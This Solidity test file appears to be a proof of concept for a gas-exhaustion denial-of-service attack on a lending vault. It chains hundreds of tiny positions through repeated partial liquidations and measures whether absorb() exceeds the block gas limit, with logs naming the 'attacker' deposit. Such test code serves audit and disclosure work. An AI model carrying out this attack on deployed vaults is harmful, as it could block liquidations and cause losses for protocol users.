// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "../vaultT1/vault/vault.t.sol";
import { TickMath } from "../../../contracts/libraries/tickMath.sol";

contract BranchChainAbsorbDosTest is VaultT1BaseTest {
    uint256 internal constant X19 = 0x7ffff;
    uint256 internal constant X20 = 0xfffff;
    uint256 internal constant X30 = 0x3fffffff;

    // vaultOne: USDC (6 decimals) collateral, DAI (18 decimals) debt.
    // The smallest accepted collateral is 10,000 raw USDC = $0.01.
    uint256 internal constant COLLATERAL_PER_BRANCH = 10_000;
    uint256 internal constant INITIAL_DEBT = 7_990_000_000_000_000; // 0.00799 DAI at 79.9% LTV
    uint256 internal constant PARTIAL_LIQUIDATION_AMOUNT = 1_000_000_000_000; // 0.000001 DAI

    uint256 internal constant HEALTHY_PRICE = 1e39;
    uint256 internal constant PARTIAL_LIQUIDATION_PRICE = (HEALTHY_PRICE * 98) / 100; // 2% move
    uint256 internal constant ABSORB_PRICE = (HEALTHY_PRICE * 80) / 100; // 20% move

    bytes4 internal constant ABSORB_SELECTOR = bytes4(keccak256("absorb()"));

    struct GasResult {
        uint256 gasUsed;
        bool completed;
        uint256 returnDataLength;
    }

    function test_linkedBranchesCanExceedBlockGas() public {
        uint256 blockGasCap_ = vm.envOr("PLASMA_BLOCK_GAS_LIMIT", uint256(36_000_000));
        uint256 wideGasCap_ = blockGasCap_ * 8;
        if (wideGasCap_ < 300_000_000) wideGasCap_ = 300_000_000;

        uint256[6] memory checkpoints_ = [
            uint256(32),
            uint256(64),
            uint256(128),
            uint256(256),
            uint256(512),
            uint256(1024)
        ];

        deal(address(USDC), alice, 1_000_000 * 1e6);
        deal(address(DAI), bob, 1_000_000 * 1e18);
        _setApproval(USDC, address(vaultOne), alice);
        _setApproval(DAI, address(vaultOne), bob);

        uint256 checkpointIndex_;
        uint256 previousWideGas_;
        uint256 totalBorrowed_;
        int256 firstBranchTick_;
        int256 lastBranchTick_;

        for (uint256 i = 1; i <= checkpoints_[checkpoints_.length - 1]; ++i) {
            uint256 rawBefore_ = _vaultVariables();
            uint256 debtAmount_ = i == 1 ? INITIAL_DEBT : _minimumDebtForTick(_topTick(rawBefore_));

            oracleOne.setPrice(HEALTHY_PRICE);
            vm.prank(alice);
            vaultOne.operate(0, int256(COLLATERAL_PER_BRANCH), int256(debtAmount_), alice);
            totalBorrowed_ += debtAmount_;

            uint256 rawAfterOpen_ = _vaultVariables();
            assertEq(rawAfterOpen_ & 2, 0, "new branch must be active before partial liquidation");
            assertEq(_totalBranches(rawAfterOpen_), i, "new position must append one linked branch");

            int256 openedTick_ = _topTick(rawAfterOpen_);
            if (i == 1) firstBranchTick_ = openedTick_;
            lastBranchTick_ = openedTick_;

            oracleOne.setPrice(PARTIAL_LIQUIDATION_PRICE);
            vm.prank(bob);
            (uint256 actualDebt_, uint256 actualCol_) = vaultOne.liquidate(
                PARTIAL_LIQUIDATION_AMOUNT,
                0,
                bob,
                false
            );

            assertGt(actualDebt_, 0, "partial liquidation must consume debt");
            assertGt(actualCol_, 0, "partial liquidation must consume collateral");
            assertLt(actualDebt_, debtAmount_, "liquidation must remain partial");

            uint256 rawAfterLiquidation_ = _vaultVariables();
            assertEq(rawAfterLiquidation_ & 2, 2, "current branch must be liquidated after each cycle");
            assertEq(_totalBranches(rawAfterLiquidation_), i, "partial liquidation must preserve branch chain");

            if (i == checkpoints_[checkpointIndex_]) {
                oracleOne.setPrice(ABSORB_PRICE);

                GasResult memory wide_ = _measureAbsorb(wideGasCap_);
                GasResult memory capped_ = _measureAbsorb(blockGasCap_);

                assertTrue(wide_.completed, "wide-cap absorb must complete for diagnostic measurement");
                if (previousWideGas_ != 0) {
                    assertTrue(wide_.gasUsed > previousWideGas_, "absorb gas must grow with branch-chain length");
                }
                previousWideGas_ = wide_.gasUsed;

                emit log_named_uint("linked branches", i);
                emit log_named_int("first branch top tick", firstBranchTick_);
                emit log_named_int("last branch top tick", lastBranchTick_);
                emit log_named_uint("tick range width", _absoluteTickDistance(firstBranchTick_, lastBranchTick_));
                emit log_named_uint("attacker deposited USDC raw", i * COLLATERAL_PER_BRANCH);
                emit log_named_uint("attacker nominal borrowed DAI wei", totalBorrowed_);
                emit log_named_uint("wide-cap absorb gas", wide_.gasUsed);
                emit log_named_uint("live block gas cap", blockGasCap_);
                emit log_named_uint("block-capped absorb completed", capped_.completed ? 1 : 0);
                emit log_named_uint("block-capped call gas", capped_.gasUsed);
                emit log_named_uint("block-capped return bytes", capped_.returnDataLength);

                oracleOne.setPrice(HEALTHY_PRICE);
                ++checkpointIndex_;
            }
        }

        assertEq(checkpointIndex_, checkpoints_.length, "all checkpoints must execute");
    }

    function _minimumDebtForTick(int256 targetTick_) internal pure returns (uint256 debtAmount_) {
        // _addDebtToTickWrite gets a rounded-down tick and then increments it by one.
        // Feeding the exact ratio for targetTick - 1 therefore lands at targetTick.
        uint256 ratio_ = TickMath.getRatioAtTick(targetTick_ - 1);
        debtAmount_ =
            ((ratio_ * COLLATERAL_PER_BRANCH) + TickMath.ZERO_TICK_SCALED_RATIO - 1) /
            TickMath.ZERO_TICK_SCALED_RATIO;

        // Compensate for the operate-side +1 debt rounding and boundary compression.
        debtAmount_ += 1000;
    }

    function _measureAbsorb(uint256 gasCap_) internal returns (GasResult memory result_) {
        uint256 snapshot_ = vm.snapshot();
        bytes memory returnData_;

        uint256 gasBefore_ = gasleft();
        (result_.completed, returnData_) = address(vaultOne).call{ gas: gasCap_ }(
            abi.encodeWithSelector(ABSORB_SELECTOR)
        );
        result_.gasUsed = gasBefore_ - gasleft();
        result_.returnDataLength = returnData_.length;

        assertTrue(vm.revertTo(snapshot_), "snapshot restore failed");
    }

    function _vaultVariables() internal view returns (uint256) {
        return vaultOne.readFromStorage(bytes32(uint256(0)));
    }

    function _totalBranches(uint256 raw_) internal pure returns (uint256) {
        return (raw_ >> 52) & X30;
    }

    function _topTick(uint256 raw_) internal pure returns (int256) {
        uint256 encoded_ = (raw_ >> 2) & X20;
        uint256 absolute_ = (encoded_ >> 1) & X19;
        return (encoded_ & 1) == 1 ? int256(absolute_) : -int256(absolute_);
    }

    function _absoluteTickDistance(int256 a_, int256 b_) internal pure returns (uint256) {
        int256 diff_ = a_ - b_;
        return uint256(diff_ < 0 ? -diff_ : diff_);
    }
}
